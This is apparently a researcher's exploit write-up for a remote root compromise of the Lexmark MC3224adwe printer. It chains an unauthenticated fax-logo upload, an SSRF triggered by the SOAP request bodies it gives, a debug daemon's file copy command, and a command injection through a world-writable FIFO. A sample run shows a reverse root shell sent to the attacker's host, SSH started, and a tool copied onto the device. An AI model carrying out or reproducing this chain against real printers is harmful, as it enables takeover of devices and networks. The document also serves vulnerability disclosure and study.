# Lexmark MC3224adwe RCE exploit

## Introduction

This document details a vulnerability in the Lexmark MC3224adwe printer.
This vulnerability was uncovered using static code analysis and verified to be working on
the latest available firmware for this device (version **CXLBL.081.225** at the time of writing).

## Vulnerabilities

The full exploit chains a couple of seemingly harmless/isolated functionalities
to eventually fully compromise the device.

### File upload primitive

By sending a HTTP POST request to the URI endpoint `/webglue/uploadfile/ImportFaxLogo`
we can upload arbitrary file data, which will always be written to the file `/var/fs/shared/faxdata/logo`
on the filesystem.

### SSRF primitive

There is a daemon listening on TCP port `65002` that relates to various SOAP webservices.
Amongst these SOAP webservices is one that is responsible for handling a web printing
standard defined by Microsoft known as WS-Print (https://learn.microsoft.com/en-us/windows-hardware/drivers/print/ws-print-v1-1).

By carefully crafting a series of HTTP POST requests with the correct SOAP bodies
we can convince the server to make a HTTP callback to an endpoint of our choosing.

The SOAP requests make use of the following XML schema namespaces:

- soap: "http://www.w3.org/2003/05/soap-envelope"
- wsa: "http://schemas.xmlsoap.org/ws/2004/08/addressing"
- wse: "http://schemas.xmlsoap.org/ws/2004/08/eventing"
- ew: "http://www.example.com/warnings"
- pri: "http://schemas.microsoft.com/windows/2006/08/wdp/print"

The SOAP envelope bodies that need to be sent look (abbreviated, consult exploit code for full listing) like this:

#### SOAP Request 1

```xml
<!-- abbreviated SOAP request -->
<soap:Body>
    <wse:Subscribe>
      <wse:EndTo>
        <wsa:Address>http://127.0.0.1:12039</wsa:Address>
        <wsa:ReferenceProperties>
          <ew:MySubscription>1234</ew:MySubscription>
        </wsa:ReferenceProperties>
        <wsa:ReferenceParameters>
          <wse:Identifier>IDID-1</wse:Identifier>
        </wsa:ReferenceParameters>
      </wse:EndTo>
      <wse:Delivery>
        <wse:NotifyTo>
          <wsa:Address>http://callback_address_goes_here</wsa:Address>
          <wsa:ReferenceParameters>
            <wse:Identifier>identifier</wse:Identifier>
          </wsa:ReferenceParameters>
        </wse:NotifyTo>
      </wse:Delivery>
      <wse:Filter>http://schemas.microsoft.com/windows/2006/08/wdp/print/JobStatusEvent</wse:Filter>
    </wse:Subscribe>
</soap:Body>
<!-- abbreviated -->
```

#### SOAP Request 2

```xml
<!-- abbreviated SOAP request -->
  <soap:Body>
    <pri:CreatePrintJobRequest>
      <pri:PrintTicket>
        <pri:JobDescription>
          <pri:JobName>JOBNAME</pri:JobName>
          <pri:JobOriginatingUserName>user</pri:JobOriginatingUserName>
        </pri:JobDescription>
      </pri:PrintTicket>
    </pri:CreatePrintJobRequest>
  </soap:Body>
<!-- abbreviated -->
```

When the callbacks are being made the software does not do any sanity-checking
on the destination of the callbacks, thus it is possible to send callbacks
to arbitrary hosts, including the printer itself. This is a SSRF (Server-Side-Request-Forgery)
vulnerability.

### File copy primitive

The printer runs a debugging daemon on TCP port `12039` that relates to debugging
of fax functionality. This daemon is not reachible from the outside world normally.
The daemon is implemented as part of the `/usr/bin/faxserviceapp` binary.

The daemon can be interfaced with using a simple line based protocol. Most of the
commands aren't super interesting to us, but one stands out: copy file. it can be
used to copy file data from a source path to a destination path. This is all executed
as the user running the `faxserviceapp` daemon (user `fax).

### Privilege escalation

There is a process called `/usr/bin/auto-fwdebugd` that is started as a systemd
service. If we look at the systemd service definitions files for this process we
see:

```
[Unit]
Description=Automatic fwdebug pipe

[Socket]
ListenFIFO=/run/svcerr/auto_fwdebug_pipe
SocketMode=0666

[Install]
WantedBy=sockets.target
```

It registers a named FIFO called `/run/svcerr/auto_fwdebug_pipe`. The `main()`
function of `auto-fwdebugd` essentially polls this FIFO for commands. What is
interesting to note here is that the `SocketMode` specified in the systemd service
file is 0666, meaning any user can write to this FIFO file. When input is read()
from this FIFO it will scan for a semicolon `;` character and format a command
to be invoked based on whatever comes behind it. This input is not sanitized
and leads to a command injection vulnerability.

## Exploitation

By chaining all of the above primitives, a full compromise and privilege escalation
of the system is possible:

- We use the arbitrary file upload bug to write a privilege escalation payload to the filesystem
- We send two HTTP requests with the correct SOAP bodies to TCP port 65002
- This triggers an SSRF condition that will send a HTTP request to the internal TCP port `12039`
- Because the daemon on TCP port `12039` uses a line based protocol, the HTTP request stanza
  is ignored until it reaches our controlled input that was being smuggled as part of the
  path in our callback URI.
- Multiple 'copy file' commands are being executed by the SSRF trigger which preserve
  our LPE payload and trigger the execution of commands by writing malicious
  input to `/run/svcerr/auto_fwdebug_pipe`
- The `auto-fwdebugd` daemon picks up this malicious input and ends up executing an arbitrary
  command (that is limited in length, but sufficiently long enough to stage to a bigger payload)
- Code execution as the `root` user is achieved.

The full runtime of the exploit is slightly long due to the fact a lot of processing
is done by `auto-fwdebugd` until the execution of our payload is reached. In my testing
environment it took ~100 seconds on average to reach this condition.

Please refer to the exploit code for the full details of all steps involved.

## Exploit Output

A typical run of the exploit should look like this. After exploitation is finished
a rootshell is spawned.

```
$ python exploit.py 192.168.2.18 192.168.2.14

      $$$ Lexmark MC3224adwe RCE Exploit $$$
          -- by blasty <peter@haxx.in> --

<11:25:10> [i] HACK: attacking 192.168.2.28, sending shells to 192.168.2.14
<11:25:10> [~] UPLOAD: upload lpe polyglot
<11:25:11> [~] COPY: copy polyglot to /tmp and pipe
<11:25:11> [~] SSRF: trigger part 1
<11:25:11> [~] SSRF: trigger part 2
<11:25:16> [~] WAIT: patience you must have, my young padawan
<11:25:25> [i] CLOCK: 15 seconds elapsed..
<11:25:40> [i] CLOCK: 30 seconds elapsed..
<11:25:55> [i] CLOCK: 45 seconds elapsed..
<11:26:10> [i] CLOCK: 60 seconds elapsed..
<11:26:25> [i] CLOCK: 75 seconds elapsed..
<11:26:40> [i] CLOCK: 90 seconds elapsed..
<11:26:55> [i] CLOCK: 105 seconds elapsed..
<11:27:07> [!] ROOT-SHELL: YES! Connection from: ('192.168.2.28', 40924)
<11:27:07> [!] ROOT-SHELL: id output: uid=0(root) gid=0(root)

<11:27:07> [i] HACK: pwning took 116 seconds!
<11:27:07> [!] HACK: we have 184 seconds left, phew!
<11:27:07> [?] HACK: lets see if our ssh daemon is alive..
<11:27:07> [*] HACK: (0) attempting to connect to ssh..
<11:27:08> [*] HACK: (1) attempting to connect to ssh..
<11:27:08> [!] HACK: YES! ssh banner: SSH-2.0-OpenSSH_8.2

<11:27:08> [!] HACK: copying flair to target..
Warning: Permanently added '192.168.2.28' (ED25519) to the list of known hosts.
software                                                                                                                                100%   73KB 542.0KB/s   00:00
<11:27:08> [!] HACK: spawning flair and interactive ssh shell..
Warning: Permanently added '192.168.2.28' (ED25519) to the list of known hosts.
<11:27:10> [i] CLOCK: 120 seconds elapsed..

root@ET788C77F816DD:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ET788C77F816DD:~# uname -a
Linux ET788C77F816DD 5.4.90-yocto-standard #1 SMP PREEMPT Tue Nov 1 10:28:19 UTC 2022 armv7l GNU/Linux
root@ET788C77F816DD:~# head /proc/cpuinfo
processor	: 0
model name	: ARMv7 Processor rev 4 (v7l)
BogoMIPS	: 50.00
Features	: half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm aes pmull sha1 sha2 crc32
CPU implementer	: 0x41
CPU architecture: 7
CPU variant	: 0x0
```

## Contact Details

- Peter "blasty" Geissler
- E-mail: peter@haxx.in
